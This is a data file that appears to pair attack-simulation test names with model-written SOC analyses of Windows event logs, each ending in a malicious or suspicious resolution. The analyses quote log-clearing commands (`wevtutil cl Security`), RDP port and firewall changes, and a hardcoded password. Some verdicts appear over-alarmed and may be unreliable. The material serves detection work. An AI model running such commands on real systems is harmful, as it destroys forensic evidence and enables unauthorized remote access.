Copy and Execute File with PsExec,"Upon analyzing the provided logs, several events stand out that could be indicative of malicious activity or unusual behavior on the host:

**1. Log Clearance Events:**
- In the Security log and System logs, there are multiple instances where logs have been cleared (`EventID: 1102` in Security, and `EventID: 104` in System). This action was performed by a user with the username `admin_test`. Log clearance events can be suspicious because attackers often clear logs to cover their tracks after gaining unauthorized access.

**2. Execution of PsExec:**
- The Sysmon log shows the execution of `PsExec.exe` from `C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads\`. PsExec is a legitimate Microsoft utility used to execute processes on remote systems, but it is commonly used by attackers to move laterally or execute arbitrary commands on remote systems.

**3. Creation of PsExec Service:**
- A new service called `PSEXESVC` was installed with `PSEXESVC.exe` as its image path, which further indicates that PsExec was used. The creation of this service suggests remote execution activity that may have been unauthorized.

**4. Privilege Use and User Activity:**
- Multiple privilege assignment events are logged for the user `admin_test` with highly sensitive privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeBackupPrivilege`. These are high-level privileges usually not granted to regular users and can be a sign of privilege escalation.

**5. Unusual Command-Line Usage:**
- The use of `wevtutil.exe` to clear logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`) by `admin_test` is observed. This is a clear indicator of attempts to erase forensic data, typically seen in post-exploitation scenarios.

**6. Elevated Token Activity:**
- The user `admin_test` was granted elevated tokens several times within short periods. Elevated tokens allow a user process to perform actions that require administrative permissions, which can point to privilege escalation tactics.

The combination of these activities strongly suggests that the system may have been compromised and is being used for unauthorized activity. Below is the final assessment:

**Resolution: MALICIOUS**

**Threats and Risks Identified:**
- Unauthorized log clearance and use of PsExec suggest malicious intent, possibly indicating that the system is being used by an attacker who has gained elevated access.
- Privilege escalation and misuse of administrative-level privileges pose significant risk to the integrity and confidentiality of the system.
- Potential remote execution of code and lateral movement could compromise additional systems or data.

**Guidance:**
1. **Isolate the Host:** Immediately isolate the affected host from the network to prevent further potential compromise.
2. **Conduct Further Investigation:** Utilize other forensic methods to gather additional evidence and determine the extent of the compromise.
3. **Review Access Logs:** Check for other systems that `admin_test` or the IP address `fe80::e3b5:5371:12a8:9c77` may have accessed.
4. **Change Credentials:** Promptly reset credentials for `admin_test` and review all credentials for unauthorized access.
5. **Rebuild or Clean System:** Consider fully rebuilding the system from a known clean state or conduct a thorough clean-up while ensuring the elimination of potential backdoors.
6. **Enhance Monitoring and Logging:** Bolster monitoring on critical systems to detect unusual activities and prevent a recurrence. 

These steps should help in stopping ongoing malicious activities and preventing further exploitation of the system."
Changing RDP Port to Non Standard Port via Powershell,"Upon analyzing the provided event logs from the Windows host, several indicators suggest potential malicious activity:

### Detailed Analysis:

1. **Event Log Clearing:**
   - **Security EventID 1102** and **System EventID 104** indicate the security, system, and PowerShell logs being cleared. This is a typical action taken by an attacker to cover tracks after performing unauthorized activities on a system.
   - The user `admin_test` executed these log-clearing commands, suggesting that a user with administrative privileges was used for this purpose.

2. **Anomalous Use of Tools:**
   - **Sysmon EventID 1 and 5** show the execution of `wevtutil.exe` to clear logs, corroborated by command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Security""` and other relevant channels. `wevtutil` is a legitimate utility but its use in this context (especially combined with cleared logs) suggests malicious intent.
   - **Use of PowerShell**: The presence of a PowerShell process modifying the RDP port (`Set-ItemProperty`) and adding a new firewall rule (`New-NetFirewallRule`) to allow inbound traffic on this new port is highly suspicious. This action directly indicates an attempt to set up unauthorized remote access.

3. **Process Creation and Execution:**
   - Multiple `whoami.exe` and `conhost.exe` executions are recorded. While standalone executions might be normal, their frequent invocation in rapid succession might be part of a script or malware. However, this by itself is not definitive without other corroborating evidence.

4. **Credential and Process Auditing Failures:**
   - **Security EventID 5379** shows repeated failed credential access attempts, evidenced by the `ReturnCode: 3221226021`, which translates to ""An attempt was made to reference a token that does not exist."" While normally part of audit noise, in conjunction with other malicious indicators, it can suggest unauthorized attempts to access credentials or perform operations using non-existent tokens.

### Assessment

Combining the log clearing with the suspicious PowerShell activity and attempts at changing RDP configurations, it is clear that someone with malicious intent could have been attempting to establish persistent remote access to the system while erasing tracks of such activities. The actions taken on this machine align with common post-exploitation steps seen in security incidents.

### Conclusion

The analysis leads to a resolution of **MALICIOUS** activity based on:
- Log clearing events by a user with administrative privileges.
- Unauthorized modification of critical RDP settings and firewall rules using PowerShell.
- Evidence of suspicious behavior aiming to obscure visibility on the system.

### Recommended Actions:

1. **Immediate Isolation**: Disconnect `Server002` from the network to prevent potential lateral movement or further exfiltration activities.
2. **Full Forensic Analysis**: Conduct a thorough forensic investigation, reviewing memory dumps, file changes, and further event logs from any connected systems.
3. **Review and Change Credentials**: Update credentials used on this machine, particularly those with administrative privileges, and investigate any potential compromises.
4. **Identify Persistence Mechanisms**: Check for scheduled tasks, registry changes, and startup file alterations that may offer persistence to the attacker.
5. **Audit Remote Access Configurations**: Ensure RDP and other remote access methods are appropriately authorized and logged.
6. **Enhance Monitoring**: Strengthen logging and monitoring capabilities to catch such activities earlier in the kill chain."
PDQ Deploy RAT,"Upon analyzing the provided logs, we can draw the following insights into whether there is malicious activity:

### Suspicious or Anomalous Behavior:

1. **Log File Clearing Events**:
   - Multiple logs, particularly the Security, System, and Windows PowerShell logs, have been cleared almost simultaneously by the same user (`admin_test`). This can be observed from the events with IDs like `1102` in Security log and `104` in System log. Clearing logs is a known tactic used by attackers to cover their tracks.

2. **Command Execution**:
   - The execution of `wevtutil.exe cl` commands is used for clearing event logs (Sysmon EventID 1 and 5). These actions are recorded in the Sysmon logs and corroborate the event log clearing activities.
   - The use of PowerShell to download and execute software (`PDQ Deploy`) in a silent mode is noted. The script downloads a file from an external URL and installs it without user notification which could be suspicious, especially in environments where such activities are not common or authorized.

3. **Unusual Installations with Elevated Privileges**:
   - The installation of `PDQ Deploy` using administrative privileges appears peculiar given the context and the attempt to obscure this activity by clearing logs afterward.
   
4. **Use of PowerShell**:
   - Several events indicate the execution of PowerShell commands (`powershell.exe -ExecutionPolicy Restricted`) which are not inherently malicious but are noteworthy if they deviate from typical administrative tasks or are used excessively to download and execute potentially harmful payloads.

### Malicious Indications:

- **Log Clearing**: The deliberate erasure of logs suggests potential malicious activity, especially as it coincides with the installation and execution of a potentially unauthorized application (`PDQ Deploy`) sourced from an external download.
  
- **External Payload Execution**: The downloading and execution of the PDQ Deploy installer could be a method for deploying further payloads or gaining control of the system, although PDQ Deploy itself is legitimate software, how it's being used here raises red flags.

### Assessment:

Given the series of events, we have identified several indicators suggestive of potentially malicious activities — particularly the simultaneous clearing of event logs, downloading, and silent installation of external software.

### Resolution: **MALICIOUS**

**Guidance:**
1. **Immediate Containment**: Halt any ongoing suspicious processes and block any potential command and control communications.
   
2. **Full System Audit and Investigation**: Conduct a thorough examination to determine the extent of the compromise, inspect system integrity, examine any persistent memory or file-based malicious artifacts.

3. **User Activity Review**: Investigate the actions and intent of user `admin_test` to establish whether these actions were intentional and authorized or indicative of compromised credentials.

4. **Policy and Access Review**: Review and strengthen administrative access policies to prevent unauthorized use of privileged accounts in the future.

5. **System Restoration**: Consider restoring the system from a secure backup to ensure all potential backdoors installed are removed.

6. **Enhance Monitoring**: Implement heightened monitoring for further indicators of compromise including unusual user activities or command executions."
Deploy 7-Zip Using Chocolatey,"Upon reviewing the provided Windows event logs, the following points stand out:

1. **EdgeUpdate Activity**:
   - There are several instances of `MicrosoftEdgeUpdate.exe` being executed, which are part of the Microsoft Edge update process. The activity includes running setup executables and registration executables, which suggest an update process is occurring.
   - The ParentUser is `NT AUTHORITY\SYSTEM`, which is normal for system updates, indicating these processes are executed with appropriate privileges.

2. **PowerShell Activity**:
   - A PowerShell script is executed to install 7-Zip using Chocolatey (`choco install -y 7zip`). This action seems authorized as the user `SERVER002\admin_test` is executing this script. However, installation of software through PowerShell, especially using third-party package managers like Chocolatey, should be monitored in environments where such actions are restricted.

3. **Log Clearing**:
   - The security and system logs are cleared around `2024-10-23 16:02:00`. The clearing of logs is a red flag and suggests potential attempts to cover up malicious activity. The user who cleared the logs is `SERVER002\admin_test`.

4. **wevtutil.exe**:
   - Invocation of `wevtutil.exe` to clear event log channels (Microsoft-Windows-Sysmon/Operational, Application, etc.) is recorded, which aligns with the log clearing activity.

5. **Security Log Clearing (Event ID 1102)**:
   - The security log being cleared by `admin_test` (`UserId: S-1-5-21-3962163828-2803415714-1403596700-1006`) with `ClientProcessId: 7072` raises suspicion further. Log clearing could indicate malicious behavior as it is often used to cover tracks post-compromise.

**Summary and Resolution**:
- **BENIGN** activities include the routine Microsoft Edge updates.
- **SUSPICIOUS** activities include:
  - The use of PowerShell to install software if it is not standard practice in the environment, especially using third-party tools like Chocolatey.
  - The clearing of system logs, which suggests deliberate removal of logs, potentially to hide unauthorized actions.

Given the actions involving log clearing, especially the security logs, this activity suggests potential malicious intent, warranting further investigation.

**Final Resolution**: **SUSPICIOUS**.

**Guidance**: Immediate action should include:
  - Further investigation into `admin_test`'s activities, especially around the time of log clearing.
  - Verification if the PowerShell script execution and software installation were authorized.
  - Ensure all endpoints and logs are monitored more rigorously, and additional controls are put in place to prevent unauthorized software installation and log clearing in the future."
Changing RDP Port to Non Standard Port via Command_Prompt,"Upon reviewing the provided logs, there are several events that stand out as potentially suspicious or indicative of malicious activity:

1. **Event Log Clearing**: 
   - The event log indicates multiple entries of logs being cleared by a user, `admin_test`. Evidence of logs being cleared is often an indication of attempting to hide malicious activity.
   - Specifically, event IDs 1102 and 104 (Security and System logs, respectively) show the use of `wevtutil.exe` to clear logs, which is questionable when done without apparent legitimate reasoning.

2. **Privilege Escalation and Abnormal Access**:
   - Event ID 4672 shows the account `admin_test` receiving a set of elevated privileges, such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`. These privileges are not typically necessary for most administrative tasks and can suggest an attempt to escalate privileges or perform unauthorized actions.
   - Additionally, the logon type 3 for `admin_test` indicates network logons, which could be legitimate, but coupled with other observations, this raises suspicion.

3. **System Time Change**:
   - Events 4616 and related show a system time alteration (`NewTime` being set to an earlier time), potentially to confuse logging timestamps or circumvent restrictions based on time, such as scheduled tasks or log rotation with time windows.
   - Time changes by `svchost.exe`, a common Windows process, could be anomalous without a legitimate cause explained by related system updates or similar legitimate operations.

4. **Unusual Commands Executed**:
   - The Sysmon logs identify `cmd.exe` executing a command to change the RDP port and make firewall changes (`reg.exe` and `netsh.exe` modifying the RDP port to 4489) which might suggest an unauthorized attempt to establish persistence by modifying network configurations injudiciously.

5. **Edge Installations**:
   - Multiple Edge-related setup operations are noted. While remarkably intricate, they align with system-level updates and installations. However, when viewed along with other suspicious activities, this behavior warrants further inspection for assurance.

**Assessment**:
Based on these observations, I categorize this activity as **MALICIOUS**. The combination of log clearing, privilege escalation, attempts to modify system configurations illicitly, and unusual process executions points toward a potential compromise or an active attempt to obscure unauthorized actions.

**Recommended Actions**:
- Immediately isolate the affected system to prevent further unauthorized access.
- Conduct a comprehensive forensic investigation to identify all access points and compromised accounts.
- Change all credentials, especially for `admin_test`.
- Review security policies, especially related to log retention, user privilege management, and monitoring.
- Backtrace any network connections established to understand potential data exfiltration.
- Reassess security measures for RDP and other remote access protocols."
RDP to DomainController,"Based on the provided log entries from various sources such as the Security, System, Sysmon, and Windows PowerShell logs, here is the analysis:

### Suspicious and Anomalous Behavior:

1. **Clearing of Event Logs:**
   - Security event log ID 1102 indicates that the logs have been cleared.
   - System event log ID 104 also shows log clearance across System, Security, and Windows PowerShell channels.
   - These actions were executed by the user `admin_test`.
   - Clearing event logs is typically performed to cover tracks after malicious activities.

2. **Process Executions:**
   - **Sysmon logs show the execution of `wevtutil.exe`** for clearing logs with specific command lines (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`).
   - **Execution of `cmdkey.exe`** with command line to store credentials using a hardcoded password in PowerShell.
   - **Execution of `powershell.exe`** with a command sequence that includes the use of `cmdkey` and establishing an RDP connection using potentially sensitive credentials (`1password2!`).

3. **Privilege and Account Use:**
   - High integrity levels during execution indicate elevated privileges were used.
   - The logs reflect the user `SERVER002\admin_test` executing potentially harmful commands.

4. **Potential Credential Theft:**
   - The use of `cmdkey.exe` suggests that credentials for a terminal service connection were created, which is not standard behavior for administrative tasks and indicates potential lateral movement or persistence mechanism setup.

### Assessment:
The combination of log clearance activities, use of administrative tools with high privileges, potentially malicious PowerShell script usage, and storing credentials with `cmdkey.exe` strongly suggests attempts to cover tracks and prepare the system for remote access or lateral movement. 

### Resolution:
**MALICIOUS** - The log activities constitute malicious behavior. The execution of commands and systems through command prompt and PowerShell to clear logs, manage credentials, and potentially establish unauthorized remote connections align closely with known attack patterns, such as persistence and defense evasion.

### Guidance:
1. **Immediate Action:** 
   - Disconnect the affected system from the network to prevent further compromise.
   - Conduct a thorough forensic analysis to identify other potentially compromised systems.
   
2. **Investigate User Accounts:**
   - Reset credentials for the `admin_test` user and other potentially compromised accounts.
   - Review account usages and privileges to ensure least privilege principle.

3. **Enhance Monitoring:**
   - Implement increased monitoring on event log activities and detect attempts to clear them.
   - Ensure that logging policies are enforced and appropriately audited.

4. **Incident Response:**
   - Follow incident response protocols, collect evidence, and review the full scope of potential breaches.
   - Consider engaging an incident response team for detailed investigation and remediation specific to this incident.

5. **Security Awareness:**
   - Enhance security training related to abnormal activities and misuse of administrative tools.
   - Foster a security-conscious culture to prevent succumbing to spear-phishing or credential theft techniques."
PowerShell Lateral Movement Using Excel Application Object,"Upon reviewing the provided event logs, a few key observations indicate suspicious and potentially malicious activities:

1. **Event Log Clearing**: 
   - Multiple events indicate the clearing of logs across different channels (System, Windows PowerShell, and Security) using `wevtutil.exe`. This occurred within a very short time frame, suggesting an attempt to cover tracks, a common behavior in malicious activities.

2. **PowerShell Execution**:
   - The PowerShell logs show an unusual command execution involving copying `calc.exe` to a different location and attempting to invoke Excel via COM objects. The mechanism and purpose of this script are unclear, but its execution coincides with the time of log clear activities, raising suspicion.

3. **Process Execution via Sysmon**:
   - The Sysmon logs reveal the execution of `wevtutil.exe` commands to clear logs almost simultaneously, executed by the same user `SERVER002\\admin_test` with a high integrity level. This deliberate user action again suggests an attempt at hiding activities on the system.

4. **Unusual Command Lines**:
   - The command lines seen in PowerShell and Sysmon logs do not align with typical administrative or maintenance tasks. They indicate potential misuse of system utilities for malicious purposes.

5. **System Integrity and Legitimacy**:
   - Although Microsoft system updates and scheduled tasks are visible, the simultaneous appearance with the suspect actions underlines a planned execution strategy, potentially leveraging legitimate system operations as a decoy.

Based on these findings, especially the log clearing actions coupled with anomalous PowerShell and process activities, the analysis, like in scenarios involving unauthorized access and tampering, leads to a resolution that designates this activity as:

**MALICIOUS**

**Guidance on Proceeding:**
- Isolate the affected system (Server002) from the network to prevent further unauthorized access.
- Conduct a thorough forensic investigation to determine the origin and scope of the compromise.
- Review user accounts, especially `admin_test`, for any unauthorized access and change credentials immediately.
- Examine scheduled tasks, startup scripts, and Group Policy settings for unauthorized or malicious modifications.
- Deploy enhanced monitoring on the network for any lateral movement indicators.
- Consider working with a security incident response team for remedial actions."
